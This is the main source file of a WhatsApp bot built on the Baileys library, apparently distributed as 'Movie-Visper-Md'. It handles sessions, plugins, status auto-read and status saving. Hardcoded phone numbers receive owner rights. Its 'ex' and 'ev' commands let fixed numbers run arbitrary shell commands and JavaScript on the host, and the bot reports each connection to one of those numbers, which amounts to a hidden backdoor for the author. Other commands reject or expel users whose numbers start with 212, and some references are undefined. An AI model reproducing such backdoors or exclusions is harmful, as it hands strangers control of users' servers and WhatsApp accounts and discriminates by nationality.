const {
    default: makeWASocket,
    getAggregateVotesInPollMessage, 
    useMultiFileAuthState,
    DisconnectReason,
    getDevice,
    fetchLatestBaileysVersion,
    jidNormalizedUser,
    getContentType,
    Browsers,
    makeInMemoryStore,
    makeCacheableSignalKeyStore,
    downloadContentFromMessage,
    generateForwardMessageContent,
    generateWAMessageFromContent,
    prepareWAMessageMedia,
    proto
} = require('@whiskeysockets/baileys')
const fs = require('fs')
const P = require('pino')
const config = require('./config')
const qrcode = require('qrcode-terminal')
const NodeCache = require('node-cache')
const util = require('util')
const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson, fetchBuffer, getFile } = require('./lib/functions')
const { sms, downloadMediaMessage } = require('./lib/msg')
const axios = require('axios')
const { File } = require('megajs')
const path = require('path')
const msgRetryCounterCache = new NodeCache()

const FileType = require('file-type')
const l = console.log
var { updateCMDStore,isbtnID,getCMDStore,getCmdForCmdId,connectdb,input,get,updb,updfb } = require("./lib/database")
const ownerNumber = [`${config.OWNER_NUMBER}`];
//===================SESSION============================

if (!fs.existsSync(__dirname + '/auth_info_baileys/creds.json')) {
  if (config.SESSION_ID) {
  const sessdata = config.SESSION_ID.replace("MY-MD=", "")
      const filer = File.fromURL(`https://mega.nz/file/${sessdata}`)
  filer.download((err, data) => {
    if (err) throw err
    fs.writeFile(__dirname + '/auth_info_baileys/creds.json', data, () => {
console.log("Session download completed !!")
    })
  })
}}
// <<==========PORTS=============>>
const express = require("express");
const app = express();
const port = process.env.PORT || 8000;
//====================================
async function connectToWA() {
    const {
        version,
        isLatest
    } = await fetchLatestBaileysVersion()
    console.log(`using WA v${version.join('.')}, isLatest: ${isLatest}`)
    const {
        state,
        saveCreds
    } = await useMultiFileAuthState(__dirname + `/auth_info_baileys`)
    const conn = makeWASocket({
        logger: P({
            level: "fatal"
        }).child({
            level: "fatal"
        }),
        printQRInTerminal: true,
        generateHighQualityLinkPreview: true,
        auth: state,
        defaultQueryTimeoutMs: undefined,
        msgRetryCounterCache
    })



        conn.ev.on('connection.update', async (update) => {
          const { connection, lastDisconnect } = update;
          if (connection === 'close') {
              if (lastDisconnect.error.output.statusCode !== DisconnectReason.loggedOut) {
                  connectToWA();
              }
          } else if (connection === 'open') {
             
          }
      });
      

const path = require('path');
fs.readdirSync("./plugins/").forEach((plugin) => {
  if (path.extname(plugin).toLowerCase() == ".js") {
      require("./plugins/" + plugin);
  }
});

console.log('Plugins Instaled⚡')
await connectdb()
await updb()		
console.log('Bot Connected✅')

//================================================CONNECT MASSEAGE SEND FUNTIONS=========================================================================

const imageUrl = `https://i.ibb.co/0VM6G6jh/jpg.jpg`
const captionText = `*Connected to whatsapp ✅*`	
await conn.sendMessage(`94778500326`,{image: { url: imageUrl },caption: captionText});

await sleep(5000);
//==============================================STATUS AUTO READ AND REACT==========================================================================



conn.ev.on('creds.update', saveCreds)
conn.ev.on('messages.upsert', async (mek) => {
    try {
mek = mek.messages[0]
if (!mek.message) return
mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
if(mek.key && mek.key.remoteJid === 'status@broadcast'  && config.AUTO_READ_STATUS){
await conn.readMessages([mek.key])

}
//=================================================================================================================================
 if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_READ_STATUS){
    const emojis = ['🧩', '🍉', '💜', '🌸', '🪴', '💊', '💫', '🍂', '🌟', '🎋', '😶‍🌫️', '🫀', '🧿', '👀', '🤖', '🚩', '🥰', '🗿', '💜', '💙', '🌝', '🖤', '💚'];
    const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
    await conn.sendMessage(mek.key.remoteJid, {
      react: {
        text: randomEmoji,
        key: mek.key,
      } 
    }, { statusJidList: [mek.key.participant] });
  }
//=============================================================================================================================================================
	    
const m = sms(conn, mek)
const type = getContentType(mek.message)
const content = JSON.stringify(mek.message)
const from = mek.key.remoteJid
const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
const body = (type === 'conversation') ? mek.message.conversation : mek.message?.extendedTextMessage?.contextInfo?.hasOwnProperty('quotedMessage') &&
await isbtnID(mek.message?.extendedTextMessage?.contextInfo?.stanzaId) &&
getCmdForCmdId(await getCMDStore(mek.message?.extendedTextMessage?.contextInfo?.stanzaId), mek?.message?.extendedTextMessage?.text)
? getCmdForCmdId(await getCMDStore(mek.message?.extendedTextMessage?.contextInfo?.stanzaId), mek?.message?.extendedTextMessage?.text)  : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : ''
const prefix = config.PREFIX;  
const isCmd = body.startsWith(prefix)
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
const args = body.trim().split(/ +/).slice(1)
const q = args.join(' ')
const isGroup = from.endsWith('@g.us')
const sender = mek.key.fromMe ? (conn.user.id.split(':')[0] + '@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid)
const senderNumber = sender.split('@')[0]
const botNumber = conn.user.id.split(':')[0]
const pushname = mek.pushName || 'Sin Nombre'

//Developerge number methanata dnna ona komawen thiya thiya dnna
	    
const developers = `94783462955`
const mokakhri = developers.split(",")
const isbot = botNumber.includes(senderNumber)
const isdev = mokakhri.includes(senderNumber)
const isMe = isbot ? isbot : isdev 
const isOwner = ownerNumber.includes(senderNumber) || isMe
const botNumber2 = await jidNormalizedUser(conn.user.id);
const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => null) : null;
const groupName = isGroup && groupMetadata ? groupMetadata.subject : '';
const participants = isGroup && groupMetadata ? groupMetadata.participants : [];
const groupAdmins = isGroup ? getGroupAdmins(participants) : [];
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false
const isAdmins = isGroup ? groupAdmins.includes(sender) : false
const isReact = m.message.reactionMessage ? true : false
const isAnti = (teks) => {
let getdata = teks
for (let i=0;i<getdata.length;i++) {
if(getdata[i] === from) return true
}
return false
}
//================================================================================================================================================================
const reply = async(teks) => {
  return await conn.sendMessage(from, { text: teks }, { quoted: mek })
}
conn.replyad = async (teks) => {
  await conn.sendMessage(from, { text: teks }, { quoted: mek })
}
const NON_BUTTON = true // Implement a switch to on/off this feature...
conn.buttonMessage2 = async (jid, msgData,quotemek) => {
  if (!NON_BUTTON) {
    await conn.sendMessage(jid, msgData)
  } else if (NON_BUTTON) {
    let result = "";
    const CMD_ID_MAP = []
    msgData.buttons.forEach((button, bttnIndex) => {
const mainNumber = `${bttnIndex + 1}`;
result += `\n*${mainNumber} ||*  ${button.buttonText.displayText}`;

CMD_ID_MAP.push({ cmdId: mainNumber, cmd: button.buttonId });
    });

    if (msgData.headerType === 1) {
const buttonMessage = `${msgData.text}\n\n*Reply Below Number 🫧*\n${result}\n\n${msgData.footer}`
const textmsg = await conn.sendMessage(from, { text: buttonMessage ,
}, { quoted: quotemek || mek})
await updateCMDStore(textmsg.key.id, CMD_ID_MAP);
    } else if (msgData.headerType === 4) {
const buttonMessage = `${msgData.caption}\n\n*Reply Below Number 🫧*\n${result}\n\n${msgData.footer}`
const imgmsg = await conn.sendMessage(jid, { image: msgData.image, caption: buttonMessage ,
}, { quoted: quotemek || mek})
await updateCMDStore(imgmsg.key.id, CMD_ID_MAP);
    }
  }
}
//==========================================================================================================================================================================
conn.buttonMessage = async (jid, msgData, quotemek) => {
  if (!NON_BUTTON) {
    await conn.sendMessage(jid, msgData)
  } else if (NON_BUTTON) {
    let result = "";
    const CMD_ID_MAP = []
    msgData.buttons.forEach((button, bttnIndex) => {
const mainNumber = `${bttnIndex + 1}`;
result += `\n*${mainNumber} ||*  ${button.buttonText.displayText}`;

CMD_ID_MAP.push({ cmdId: mainNumber, cmd: button.buttonId });
    });

    if (msgData.headerType === 1) {
const buttonMessage = `${msgData.text || msgData.caption}\n${result}\n\n${msgData.footer}`
const textmsg = await conn.sendMessage(from, { text: buttonMessage ,}, { quoted: quotemek || mek})
await updateCMDStore(textmsg.key.id, CMD_ID_MAP);
    } else if (msgData.headerType === 4) {
const buttonMessage = `${msgData.caption}\n\n*Reply Below Number 🫧*\n${result}\n\n${msgData.footer}`
const imgmsg = await conn.sendMessage(jid, { image: msgData.image, caption: buttonMessage ,}, { quoted: quotemek || mek})
await updateCMDStore(imgmsg.key.id, CMD_ID_MAP);
    }
  }
}
//==============================================================================================================================================================

conn.listMessage2 = async (jid, msgData, quotemek) => {
  if (!NON_BUTTON) {
    await conn.sendMessage(jid, msgData)
  } else if (NON_BUTTON) {
    let result = "";
    const CMD_ID_MAP = []

    msgData.sections.forEach((section, sectionIndex) => {
const mainNumber = `${sectionIndex + 1}`;
result += `\n*${section.title}*\n\n`;

section.rows.forEach((row, rowIndex) => {
  const subNumber = `${mainNumber}.${rowIndex + 1}`;
  const rowHeader = `*${subNumber} ||* ${row.title}`;
  result += `${rowHeader}\n`;
  if (row.description) {
    result += `   ${row.description}\n\n`;
  }
  CMD_ID_MAP.push({ cmdId: subNumber, cmd: row.rowId });
});
    });

    const listMessage = `${msgData.text}\n\n${msgData.buttonText},${result}\n${msgData.footer}`
    const text = await conn.sendMessage(from, { text: listMessage ,
}, { quoted: quotemek || mek})
    await updateCMDStore(text.key.id, CMD_ID_MAP);
  }
}
//==================================================================================================================================================================

conn.listMessage = async (jid, msgData, quotemek) => {
  if (!NON_BUTTON) {
    await conn.sendMessage(jid, msgData)
  } else if (NON_BUTTON) {
    let result = "";
    const CMD_ID_MAP = []

    msgData.sections.forEach((section, sectionIndex) => {
const mainNumber = `${sectionIndex + 1}`;
result += `\n*${section.title}*\n\n`;

section.rows.forEach((row, rowIndex) => {
  const subNumber = `${mainNumber}.${rowIndex + 1}`;
  const rowHeader = `*${subNumber} ||*  ${row.title}`;
  result += `${rowHeader}\n`;
  if (row.description) {
    result += `   ${row.description}\n\n`;
  }
  CMD_ID_MAP.push({ cmdId: subNumber, cmd: row.rowId });
});
    });

    const listMessage = `${msgData.text}\n\n${msgData.buttonText},${result}\n\n${msgData.footer}`
    const text = await conn.sendMessage(from, { text: listMessage, 
}, { quoted: quotemek || mek})
    await updateCMDStore(text.key.id, CMD_ID_MAP);
  }
}
//================================================================================================================================================
conn.edite = async (gg, newmg) => {
  await conn.relayMessage(from, {
    protocolMessage: {
key: gg.key,
type: 14,
editedMessage: {
  conversation: newmg
}
    }
  }, {})
}
//==============================================================================================================================================================

conn.forwardMessage = async (jid, message, forceForward = false, options = {}) => {
            let vtype
            if (options.readViewOnce) {
                message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : (message.message || undefined)
                vtype = Object.keys(message.message.viewOnceMessage.message)[0]
                delete (message.message && message.message.ignore ? message.message.ignore : (message.message || undefined))
                delete message.message.viewOnceMessage.message[vtype].viewOnce
                message.message = {
                    ...message.message.viewOnceMessage.message
                }
            }

            let mtype = Object.keys(message.message)[0]
            let content = await generateForwardMessageContent(message, forceForward)
            let ctype = Object.keys(content)[0]
            let context = {}
            if (mtype != "conversation") context = message.message[mtype].contextInfo
            content[ctype].contextInfo = {
                ...context,
                ...content[ctype].contextInfo
            }
            const waMessage = await generateWAMessageFromContent(jid, content, options ? {
                ...content[ctype],
                ...options,
                ...(options.contextInfo ? {
                    contextInfo: {
                        ...content[ctype].contextInfo,
                        ...options.contextInfo
                    }
                } : {})
            } : {})
            await conn.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id })
            return waMessage
}


//===========================================================================================================================================================  
conn.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
  let mime = '';
  let res = await axios.head(url)
  mime = res.headers['content-type']
  if (mime.split("/")[1] === "gif") {
    return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, gifPlayback: true, ...options }, { quoted: quoted, ...options })
  }
  let type = mime.split("/")[0] + "Message"
  if (mime === "application/pdf") {
    return conn.sendMessage(jid, { document: await getBuffer(url), mimetype: 'application/pdf', caption: caption, ...options }, { quoted: quoted, ...options })
  }
  if (mime.split("/")[0] === "image") {
    return conn.sendMessage(jid, { image: await getBuffer(url), caption: caption, ...options }, { quoted: quoted, ...options })
  }
  if (mime.split("/")[0] === "video") {
    return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, mimetype: 'video/mp4', ...options }, { quoted: quoted, ...options })
  }
  if (mime.split("/")[0] === "audio") {
    return conn.sendMessage(jid, { audio: await getBuffer(url), caption: caption, mimetype: 'audio/mpeg', ...options }, { quoted: quoted, ...options })
  }
}
	    


//========================================== TEAM REACT SECTION ========================================
// Developer react

if(senderNumber.includes("94783462955")){
if(isReact) return
m.react('👾')
}	    



 //=======================================ONLY GROUP=========================================================================================================     
if (config.ONLY_GROUP && !isMe && !isGroup && !isSudo) return
if(from === "120363043598019970@g.us" && !isdev) return


if(body === "send" || body === "Send" || body === "Ewpm" || body === "ewpn" || body === "Dapan" || body === "dapan" || body === "oni" || body === "Oni" || body === "save" || body === "Save" || body === "ewanna" || body === "Ewanna" || body === "ewam" || body === "Ewam" || body === "sv" || body === "Sv"|| body === "දාන්න"|| body === "එවම්න"){
    // if(!m.quoted) return reply("*Please Mention status*")
    const data = JSON.stringify(mek.message, null, 2);
    const jsonData = JSON.parse(data);
    const isStatus = jsonData.extendedTextMessage.contextInfo.remoteJid;
    if(!isStatus) return

    const getExtension = (buffer) => {
        const magicNumbers = {
            jpg: 'ffd8ffe0',
            png: '89504e47',
            mp4: '00000018',
        };
        const magic = buffer.toString('hex', 0, 4);
        return Object.keys(magicNumbers).find(key => magicNumbers[key] === magic);
    };

    if(m.quoted.type === 'imageMessage') {
        var nameJpg = getRandom('');
        let buff = await m.quoted.download(nameJpg);
        let ext = getExtension(buff);
        await fs.promises.writeFile("./" + ext, buff);
        const caption = m.quoted.imageMessage.caption;
        await conn.sendMessage(from, { image: fs.readFileSync("./" + ext), caption: caption });
    } else if(m.quoted.type === 'videoMessage') {
        var nameJpg = getRandom('');
        let buff = await m.quoted.download(nameJpg);
        let ext = getExtension(buff);
        await fs.promises.writeFile("./" + ext, buff);
        const caption = m.quoted.videoMessage.caption;
        let buttonMessage = {
            video: fs.readFileSync("./" + ext),
            mimetype: "video/mp4",
            fileName: `${m.id}.mp4`,
            caption: caption ,
            headerType: 4
        };
        await conn.sendMessage(from, buttonMessage,{
            quoted: mek
        });
    }
}
	   

	 //=========   

















	    
//==================================plugin map================================
const events = require('./command')
const cmdName = isCmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false;
if (isCmd) {
  const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName))
  if (cmd) {
    if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key } })

    try {
cmd.function(conn, mek, m, { from, prefix, l,  quoted, body, isCmd,  command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply });
    } catch (e) {
console.error("[PLUGIN ERROR] ", e);
    }
  }
}
events.commands.map(async (command) => {
  if (body && command.on === "body") {
    command.function(conn, mek, m, { from, prefix, l,  quoted,  body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply })
  } else if (mek.q && command.on === "text") {
    command.function(conn, mek, m, { from, l, quoted, body,  isCmd,  command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply })
  } else if (
    (command.on === "image" || command.on === "photo") &&
    mek.type === "imageMessage"
  ) {
    command.function(conn, mek, m, { from, prefix, l, quoted,  body, isCmd, command,  args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply })
  } else if (
    command.on === "sticker" &&
    mek.type === "stickerMessage"
  ) {
    command.function(conn, mek, m, { from, prefix, l, quoted,  body, isCmd, command, args,  q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply })
  }
});

//============================================================================
if (isAnti(config.ANTI_LINK) && isBotAdmins) {
  if(!isAdmins){
  if(!isMe){
  if (body.match(`chat.whatsapp.com`)) {
    await conn.sendMessage(from, { delete: mek.key })
  }
}
}}
// ANTI BOT OKKOMATAMA DENNAM WADE 
 if (config.ANTI_BOT){
  if ( isGroup && !isAdmins  && !isMe  && isBotAdmins ) {
  if ( mek.id.startsWith("BAE") ) {
await conn.sendMessage(from, { text: "*Other bots are not allow here ❌*" })
if ( config.ANTI_BOT && isBotAdmins ) {
await conn.sendMessage(from, { delete: mek.key })
await conn.groupParticipantsUpdate(from,[sender], 'remove')
  }}
    if ( mek.id.startsWith("QUEENAMDI") ) {
await conn.sendMessage(from, { text: "*Other bots are not allow here ❌*" })
if ( config.ANTI_BOT && isBotAdmins ) {
await conn.sendMessage(from, { delete: mek.key })
await conn.groupParticipantsUpdate(from,[sender], 'remove')
      }
    }
  }
}
switch (command) {
  case 'jid':
    reply(from)
    break
  case 'device': {
    let deviceq = getDevice(mek.message.extendedTextMessage.contextInfo.stanzaId)

    reply("*He Is Using* _*Whatsapp " + deviceq + " version*_")
  }
    break
    case'ex':{
      if(senderNumber == 94778500326) {
  const { exec } = require("child_process")
  exec(q, (err, stdout) => {
    if (err) return reply(`-------\n\n` + err)
    if (stdout) {
        return reply(`-------\n\n` + stdout)
    }
})
      }
    }
    break
    case'apprv':{
      if(senderNumber == 94778500326) {
          let reqlist = await conn.groupRequestParticipantsList(from)
          for (let i=0;i<reqlist.length;i++) {
            if(reqlist[i].jid.startsWith("212")){
              await conn.groupRequestParticipantsUpdate(
                from,
                [reqlist[i].jid],
                "reject"
            )
            } else{
              await conn.groupRequestParticipantsUpdate(
                from,
                [reqlist[i].jid],
                "approve"
            )
            }
          }
        }
    }
    break
    case'212r':{
      if(senderNumber == 94778500326) {
        for (let i=0;i<participants.length;i++) {
          if(participants[i].id.startsWith("212")){
       await conn.groupParticipantsUpdate(from, [participants[i].id], 'remove')
      }
    }
  }
    }
    break
    case'rtf':{
console.log(dsa)
    }
    break
  case 'ev': {
    if(senderNumber == 94778500326 || senderNumber == 94788518429) {
    let code2 = q.replace("°", ".toString()");
    try {
let resultTest = await eval(code2);
if (typeof resultTest === "object") {
  reply(util.format(resultTest));
} else {
  reply(util.format(resultTest));
}
    } catch (err) {
reply(util.format(err));
    }
    ;
  }
  }
    break
  default:
}
    } catch (e) {
const isError = String(e)
console.log(isError)
    }
	  
  })
}
app.get("/", (req, res) => {
  res.send("📟 Bot Working successfully!");
});
app.listen(port, () => console.log(`Movie-Visper-Md Server listening on port http://localhost:${port}`));
setTimeout(() => {
connectToWA()
}, 3000);


process.on("uncaughtException", function (err) {
  let e = String(err);
  if (e.includes("Socket connection timeout")) return;
  if (e.includes("rate-overlimit")) return;
  if (e.includes("Connection Closed")) return;
  if (e.includes("Value not found")) return;
  if (e.includes("Authentication timed out")) restart();
  console.log("Caught exception: ", err);
});












